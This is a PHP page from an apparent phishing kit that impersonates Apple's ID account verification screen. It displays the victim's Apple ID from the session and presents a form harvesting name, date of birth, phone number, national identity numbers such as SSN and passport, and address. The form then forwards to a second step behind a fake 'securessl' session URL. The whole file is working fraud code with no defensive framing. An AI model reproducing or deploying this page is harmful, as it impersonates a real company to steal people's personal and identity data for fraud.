<?php
error_reporting(0);
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/language.mob.php";
require "assets/includes/One_Time.php";
require "assets/includes/enc.php";
require_once "assets/includes/apxdev.php";
?>
<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title><?=tr('Confirm your information');?></title>
<link href="assets/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="assets/css/First.css" media="all" rel="stylesheet" type="text/css">
<link href="assets/css/Second.css" rel="stylesheet" type="text/css">
<link href="assets/css/Fonts.css" rel="stylesheet" type="text/css">
<link href="assets/css/verify.css" rel="stylesheet" type="text/css">
<style>.error {color:red}</style>
</head>
<body id="pagecontent">
<div id="content">
<div class="bdd45">
<nav id="xdsfv54" class="js no-touch svg no-ie7 no-ie8">
<div class="HeaderObjHolder">
<ul class="MobHeader">
<li class="HeaderObj MobMenIconH">
<label class="MobMenHol">
<span class="MobMenIcon MobMenIcon-top">
<span class="MobMenIcon-crust MobMenIcon-crust-top"></span> </span> <span class="MobMenIcon MobMenIcon-bottom">
<span class="MobMenIcon-crust MobMenIcon-crust-bottom"></span> </span>
</label>
</li>
<li class="HeaderObj">
<a class="Item1" href="#" style="display: inline-block;margin-left:50%;margin-top:11px" id="ac-gn-firstfocus-small"> <span class="ac-gn-link-text">&nbsp;</span> </a>
<a class="Item10" style="display: inline-block;float:right;margin-top:11px" href="#"> <span class="ac-gn-link-text">&nbsp;</span> <span class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
</li>
</ul>
<ul class="HeaderObjList">
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item1" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item2" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item3" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item4" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item5" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item6" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item7" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item8" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item9" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item10" href="#"></a></li>
</ul>
</div>
</nav>



<div id="flow">
<div class="flow-body signin clearfix" role="main">
<div class="persona-splash no-photo clearfix">
    <div class="persona-bg"></div>
    <div class="container">
        <div class="splash-section">
            <div class=" person-wrapper">
                <div>
                    <div class="row">
                        <div class="col-sm-9 appleid-col">
                            <div class="flex-container">
                                <h1 class="mobile appleid-user">
                                    <span class="first_name"><?=tr('Account Verification');?></span>
                                    <small class="SessionUser"><?=tr('Your Apple ID is');?> <strong><?php echo $_SESSION['user'];?></strong> </small>
                                </h1>
                            </div>
                        </div>
                        <div class="not-mobile col-sm-3">
                            <div class="flex-container-signout">
                                <div class="signout pull-right">
                                    <button class="btn btn-link"><?=tr('Sign Out');?> </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="container">
<div class="flex home-content">


<form action="Step2.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" method="post" name="details" id="details" class="proceed">
<div class="container flow-sections">
<div class="editable account-edit clearfix">
<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle" id="nameLabel"><?=tr('Personal Information');?></h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper first-wrapper">
<div class="name-input">
  <input type="text" name="fname" id="fname" class="generic-input-field form-control field" placeholder="<?=tr('First Name');?>">
  <span id="nameerror"></span>
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="mname" id="mname" class="generic-input-field form-control field" placeholder="<?=tr('Middle Name (Optional)');?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="lname" id="lname" class="generic-input-field form-control field" placeholder="<?=tr('Last Name');?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
<input id="dob" name="dob" class="form-control form-input" type="tel" placeholder="<?=tr('Date of Birth');?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
<input id="telephone" name="telephone" class="form-control form-input" type="tel" placeholder="<?=tr('Telephone Number');?>">
</div>
</div>
<?php echo $langx['SSN'];?>
<?php echo $langx['PASSPORT'];?>
<?php echo $langx['NUMBID'];?>
<?php echo $langx['NAID'];?>
<?php echo $langx['CIVILID'];?>
<?php echo $langx['QATARID'];?>
<?php echo $langx['CITIZENID'];?>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="address" id="address" class="generic-input-field form-control field" placeholder="<?=tr('Address Line');?> ">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="town" id="town" class="generic-input-field form-control field" placeholder="<?=tr('Town / City');?>">
</div>
</div>

<div class="form-group clearfix middle-wrapper">
<div class="select-wrapper">
<?php echo $langx['COUNTYSELECT'];?>
</div>
</div>
<div class="pop-wrapper field-pop-wrapper last-wrapper">
<div class="name-input">
  <input type="text" name="postcode" id="postcode" class="generic-input-field form-control field" placeholder="<?php echo $langx['POSTCODE'];?>">
</div>
</div>
<input type="hidden" name="country" value="<?php echo $langx['COUNTRY'];?>">
<br>
<br>
<input type="submit" class="gobtn btn-link" style="width:50%;margin-left:auto;margin-right:auto;float:right" value="<?=tr('Next');?>">
</div>
</div>
</div>
</div>
</div>
</form>



</div>
</div>
</div>
</div>
</div>
</div>
</body>
</html>